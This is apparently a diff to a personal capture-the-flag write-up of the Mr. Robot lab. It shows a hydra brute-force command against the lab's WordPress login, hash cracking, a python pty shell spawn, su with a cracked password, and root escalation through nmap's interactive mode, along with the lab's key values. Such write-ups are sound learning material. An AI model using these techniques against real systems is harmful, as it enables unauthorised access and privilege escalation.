@@ -109,7 +109,7 @@ log=user&pwd=pass&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.237.121%2Fwp-a
 ## Cracking Passwords in WordPress
 built this command with hydra and found a username
 ```sh
-$ hydra -L fsocity.dic -p pass http-post-form://10.10.237.121"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.237.121%2Fwp-admin%2F&testcookie=1:F=Invalid username" -I
+$ hydra -L fsocity.dic -p pass http-post-form://10.10.237.121"/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -I
 
 ..Snip..
 
@@ -172,3 +172,39 @@ robot:c3fcd3d76192e4007dfb496cca67e13b
 
 so we cant access the second key because we don't have privilege but the password hash seems to be in the other file so we just need to crack it
 
+...I did a ton of research because john and hash-cat didn't give any results(_using `fsocity.dic.uniq`_). Eventually I found a page called https://crackstation.net/  that was able to crack the hash!
+![[Pasted image 20250304073703.png]]
+
+so with the password we now just need to login as mr. robot
+
+
+```bash
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+daemon@linux:/$ su robot 
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:/$
+```
+
+as robot we were now able to get the second Key!
+
+---
+
+For Key number three we got the hint: "nmap" so I did some testing and turns out that nmap is installed on the system and robot has access to use it. After testing the interactive shell I found out that all commands I run with it are as root so I took a look at /root
+
+
+```bash
+robot@linux:/$ nmap --interactive 
+
+
+nmap> !whoami
+root
+nmap> !ls /root
+firstboot_done  key-3-of-3.txt
+nmap> !cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+nmap> 
+
+(snipped out all the useless stuff)
+```
